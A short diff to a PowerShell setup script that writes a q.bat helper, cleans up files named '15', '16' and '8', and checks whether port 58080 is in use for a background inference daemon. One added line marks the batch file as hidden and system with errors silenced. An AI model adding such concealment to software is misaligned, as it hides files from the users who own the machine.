@@ -229,6 +229,13 @@ if (Test-Path $AppsDir) {
     Set-Content -Path "$AppsDir\q.bat" -Value $QContent -Encoding ASCII -ErrorAction SilentlyContinue
 }
 Set-Content -Path "$env:USERPROFILE\q.bat" -Value $QContent -Encoding ASCII -ErrorAction SilentlyContinue
+& attrib +h +s "$env:USERPROFILE\q.bat" 2>$null
+
+# Remove stray probe files if present
+foreach ($f in @("15", "16", "8")) {
+    $stray = Join-Path $env:USERPROFILE $f
+    if (Test-Path $stray) { Remove-Item -Force $stray -ErrorAction SilentlyContinue }
+}
 
 # Ensure Background Inference Daemon is running
 $PortOccupied = (netstat -ano | findstr 58080)
